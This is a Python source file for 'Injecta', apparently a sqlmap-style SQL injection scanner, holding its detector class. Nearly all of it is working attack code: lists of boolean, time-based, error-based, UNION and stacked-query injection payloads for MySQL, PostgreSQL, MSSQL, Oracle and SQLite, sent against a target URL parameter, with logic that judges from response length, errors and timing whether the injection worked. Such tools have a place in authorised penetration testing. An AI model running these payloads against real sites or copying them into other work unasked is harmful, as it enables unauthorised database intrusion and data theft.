"""
Injecta — sqlmap-style injection detection engine
Context-aware detection with boundaries, statistical time-based, multi-DBMS
"""
import re
import statistics
from typing import Dict, List, Optional, Tuple, Any
from injecta.core.logger import VoidLogger
from injecta.core.context import SQLContext, generate_time_payloads
from injecta.utils.tamper import apply_tampers


class Detector:
    def __init__(self, requester, config, logger: VoidLogger):
        self.req = requester
        self.config = config
        self.log = logger
        self.tamper = []
        self._baseline = {}
        self.context = SQLContext()

    def set_tamper(self, tamper_names: List[str]):
        self.tamper = tamper_names

    def fetch_baseline(self, url: str) -> bool:
        resp, err = self.req.request(url)
        if err or resp is None:
            self.log.error(f"Baseline request failed: {err}")
            return False
        self._baseline["_global"] = {
            "status": resp.status_code,
            "length": len(resp.text),
            "text": resp.text,
            "headers": dict(resp.headers),
            "time": resp.elapsed.total_seconds(),
        }
        self.log.debug(f"Baseline: {resp.status_code} | {len(resp.text)} bytes | {resp.elapsed.total_seconds():.3f}s")
        return True

    def find_injection_points(self, url: str) -> List[str]:
        params = []
        if "?" in url and self.config.method == "GET":
            qs = url.split("?", 1)[1]
            for part in qs.split("&"):
                if "=" in part:
                    params.append(part.split("=", 1)[0])
        if self.config.data:
            for part in self.config.data.split("&"):
                if "=" in part:
                    params.append(part.split("=", 1)[0])
        if not params:
            params.append("id")
        return params

    def test_parameter(self, url: str, param: str, technique: str = "B") -> Optional[Dict[str, Any]]:
        self.log.debug2(f"Testing param '{param}' with technique '{technique}'")
        if technique == "B":
            return self._test_boolean(url, param)
        elif technique == "T":
            return self._test_time(url, param)
        elif technique == "E":
            return self._test_error(url, param)
        elif technique == "U":
            return self._test_union(url, param)
        elif technique == "S":
            return self._test_stacked(url, param)
        return None

    def _apply(self, payload: str) -> str:
        if self.tamper:
            return apply_tampers(payload, self.tamper)
        return payload

    def _test_raw(self, url: str, payload: str, param: str):
        return self.req.test_raw(url, self._apply(payload), param)

    def _detectable_difference(self, resp_text: str, baseline_text: str) -> bool:
        bl = self._baseline.get("_global", {})
        if not bl:
            return False
        len_diff = abs(len(resp_text) - len(baseline_text))
        if len_diff > 5 and len_diff > len(baseline_text) * 0.05:
            return True
        error_kw = ["error", "warning", "mysql", "syntax", "unexpected", "ORA-", "MSSQL", "driver"]
        bl_errors = sum(1 for kw in error_kw if kw.lower() in baseline_text.lower())
        resp_errors = sum(1 for kw in error_kw if kw.lower() in resp_text.lower())
        if abs(resp_errors - bl_errors) >= 1:
            return True
        return False

    def _test_boolean(self, url: str, param: str) -> Optional[Dict[str, Any]]:
        bl = self._baseline.get("_global", {})
        if not bl:
            return None
        baseline_text = bl.get("text", "")

        pair_payloads = [
            ("1 AND 1=1", "1 AND 1=2"),
            ("1 OR 1=1", "1 OR 1=2"),
            ("1' AND '1'='1", "1' AND '1'='2"),
            ("1' OR '1'='1", "1' OR '1'='2"),
            ('1" AND "1"="1', '1" AND "1"="2'),
            ('1" OR "1"="1', '1" OR "1"="2'),
            ("1) AND 1=1", "1) AND 1=2"),
            ("1') AND '1'='1", "1') AND '1'='2"),
            ("1' AND 1=1-- -", "1' AND 1=2-- -"),
            ('1" AND 1=1-- -', '1" AND 1=2-- -'),
        ]

        for true_payload, false_payload in pair_payloads:
            _, true_text, _ = self._test_raw(url, true_payload, param)
            _, false_text, _ = self._test_raw(url, false_payload, param)
            if true_text and false_text:
                diff_true = self._detectable_difference(true_text, baseline_text)
                diff_false = self._detectable_difference(false_text, baseline_text)
                if diff_true and not diff_false:
                    return {"param": param, "technique": "boolean",
                            "true_payload": true_payload, "false_payload": false_payload,
                            "confidence": 0.8}
                if diff_true and diff_false and len(true_text) != len(false_text):
                    return {"param": param, "technique": "boolean",
                            "true_payload": true_payload, "false_payload": false_payload,
                            "confidence": 0.7}

        return None

    def _test_time(self, url: str, param: str) -> Optional[Dict[str, Any]]:
        bl = self._baseline.get("_global", {})

        # sqlmap-style: 3 baseline samples for statistical comparison
        baseline_times = []
        for _ in range(3):
            _, _, t = self._test_raw(url, "1", param)
            if t is not None:
                baseline_times.append(t)

        if len(baseline_times) < 2:
            return None

        baseline_avg = statistics.mean(baseline_times)
        baseline_std = statistics.stdev(baseline_times) if len(baseline_times) > 1 else 0.3

        self.log.debug2(f"Time baseline: avg={baseline_avg:.3f}s std={baseline_std:.3f}s ({len(baseline_times)} samples)")

        delay = max(self.config.timeout // 2, 3) if hasattr(self.config, 'timeout') and self.config.timeout else 5

        payloads_by_dbms = {
            "mysql": [
                (f" AND SLEEP({delay})", "mysql"),
                (f" OR SLEEP({delay})", "mysql"),
                (f" AND SLEEP({delay})-- -", "mysql"),
                (f"' AND SLEEP({delay})-- -", "mysql"),
                (f'" AND SLEEP({delay})-- -', "mysql"),
            ],
            "postgresql": [
                (f" AND pg_sleep({delay})", "postgresql"),
                (f" OR pg_sleep({delay})", "postgresql"),
                (f" AND pg_sleep({delay})--", "postgresql"),
                (f"' AND pg_sleep({delay})--", "postgresql"),
            ],
            "mssql": [
                (f"; WAITFOR DELAY '0:0:{delay}'", "mssql"),
                (f" AND WAITFOR DELAY '0:0:{delay}'", "mssql"),
                (f" OR WAITFOR DELAY '0:0:{delay}'", "mssql"),
                (f"'; WAITFOR DELAY '0:0:{delay}'--", "mssql"),
            ],
            "oracle": [
                (f" AND DBMS_PIPE.RECEIVE_MESSAGE('x',{delay})=1", "oracle"),
                (f" OR DBMS_PIPE.RECEIVE_MESSAGE('x',{delay})=1", "oracle"),
            ],
            "sqlite": [
                (" AND randomblob(50000000)", "sqlite"),
                (" OR randomblob(50000000)", "sqlite"),
            ],
        }

        threshold = max(baseline_std * 3, 1.5)
        expected_min = baseline_avg + threshold

        # Try DBMS-specific payloads + generic ones
        all_payloads = []
        for dbms, pls in payloads_by_dbms.items():
            all_payloads.extend(pls)
        all_payloads.extend([
            (f" AND 1=1 AND SLEEP({delay})", "unknown"),
            (f' AND 1=1 AND pg_sleep({delay})', "unknown"),
            (f"; WAITFOR DELAY '0:0:{delay}'--", "unknown"),
        ])

        for payload, dbms in all_payloads:
            try:
                _, _, resp_time = self._test_raw(url, payload, param)
            except:
                continue

            if resp_time is not None and resp_time >= expected_min:
                self.log.debug2(f"Time-based hit: {payload} -> {resp_time:.3f}s (threshold: {expected_min:.3f}s)")
                return {
                    "param": param,
                    "technique": "time",
                    "payload": payload,
                    "dbms_hint": dbms if dbms != "unknown" else None,
                    "response_time": resp_time,
                    "baseline_time": baseline_avg,
                    "baseline_std": baseline_std,
                    "confidence": 0.9,
                }

        return None

    def _test_error(self, url: str, param: str) -> Optional[Dict[str, Any]]:
        error_payloads = [
            ("1'", "generic"),
            ("1' AND extractvalue(1, concat(0x7e, (SELECT 1)))-- -", "mysql"),
            ("1' AND updatexml(1, concat(0x7e, (SELECT 1)), 1)-- -", "mysql"),
            ("1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT 1), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) a)-- -", "mysql"),
            ("1' AND 1=CAST((SELECT 1) AS int)--", "postgresql"),
            ("1' AND 1=CONVERT(int, (SELECT 1))--", "mssql"),
            ("1' AND DBMS_PIPE.RECEIVE_MESSAGE('x',1)=1--", "oracle"),
        ]

        for payload, dbms in error_payloads:
            _, resp_text, _ = self._test_raw(url, payload, param)
            if resp_text:
                db_errors = re.search(
                    r'(SQL syntax|mysql_fetch|Warning.*mysql|ORA-\d{5}|MSSQL|'
                    r'Unclosed quotation|Incorrect syntax|PostgreSQL.*ERROR|'
                    r'SQLite/JDBCDriver|driver.*error|syntax error|'
                    r'XPATH|extractvalue|updatexml|CONVERT|CAST)',
                    resp_text, re.IGNORECASE
                )
                if db_errors:
                    return {"param": param, "technique": "error", "payload": payload,
                            "dbms": dbms if dbms != "generic" else "unknown",
                            "error_message": db_errors.group(0), "confidence": 0.95}
        return None

    def _test_union(self, url: str, param: str) -> Optional[Dict[str, Any]]:
        baseline_text = self._baseline.get("_global", {}).get("text", "")
        bl_len = len(baseline_text)

        import urllib.parse
        orig_val = "1"
        if "?" in url:
            qs = url.split("?", 1)[1]
            parsed = urllib.parse.parse_qs(qs)
            if param in parsed and parsed[param]:
                orig_val = parsed[param][0]

        boundaries = [
            f"{orig_val}' UNION SELECT {{vals}}-- -",
            f"{orig_val} UNION SELECT {{vals}}",
            f'{orig_val}" UNION SELECT {{vals}}-- -',
            f"{orig_val}) UNION SELECT {{vals}}-- -",
        ]

        # Use detect_column_count from extract module (binary search ORDER BY)
        from injecta.enum.extract import detect_column_count
        col_count = detect_column_count(self.req, url, param, 1024)

        # If ORDER BY found a column count, verify it
        if col_count > 1:
            vals = ",".join([str(i + 1) for i in range(col_count)])
            for tmpl in boundaries:
                payload = tmpl.format(vals=vals)
                _, resp_text, _ = self._test_raw(url, payload, param)
                if resp_text and abs(len(resp_text) - bl_len) > 10:
                    return {"param": param, "technique": "union", "payload": payload,
                            "column_count": col_count, "confidence": 0.85}

        # If ORDER BY failed, try log-scale UNION scan
        # Phase 1: log-scale values 1..128
        col = 1
        while col <= 128:
            vals = ",".join([str(i + 1) for i in range(col)])
            for tmpl in boundaries:
                payload = tmpl.format(vals=vals)
                _, resp_text, _ = self._test_raw(url, payload, param)
                if resp_text and abs(len(resp_text) - bl_len) > 10:
                    return {"param": param, "technique": "union", "payload": payload,
                            "column_count": col, "confidence": 0.85}
            col = col * 2 if col > 1 else 2

        # Phase 2: try intermediate values in the bracket where page might differ
        for col in range(3, 129, 2):
            vals = ",".join([str(i + 1) for i in range(col)])
            for tmpl in boundaries:
                payload = tmpl.format(vals=vals)
                _, resp_text, _ = self._test_raw(url, payload, param)
                if resp_text and abs(len(resp_text) - bl_len) > 10:
                    return {"param": param, "technique": "union", "payload": payload,
                            "column_count": col, "confidence": 0.85}

        return None

    def _test_stacked(self, url: str, param: str) -> Optional[Dict[str, Any]]:
        # Stacked queries are detected via time-based (WAITFOR/pg_sleep)
        # because stacked SELECT doesn't change page output
        bl = self._baseline.get("_global", {})
        if not bl:
            return None
        baseline_time = bl.get("time", 0.1)

        stacked_payloads = [
            ("mssql", "; WAITFOR DELAY '0:0:3'--"),
            ("mssql", "1'; WAITFOR DELAY '0:0:3'--"),
            ("postgresql", "; SELECT pg_sleep(3)--"),
            ("postgresql", "1'; SELECT pg_sleep(3)--"),
            ("mysql", "; SELECT SLEEP(3)-- -"),
            ("mysql", "1'; SELECT SLEEP(3)-- -"),
        ]

        for dbms, payload in stacked_payloads:
            try:
                _, _, elapsed = self._test_raw(url, payload, param)
                if elapsed and elapsed > baseline_time + 2:
                    return {"param": param, "technique": "stacked", "payload": payload,
                            "dbms_hint": dbms, "confidence": 0.8}
            except:
                continue
        return None
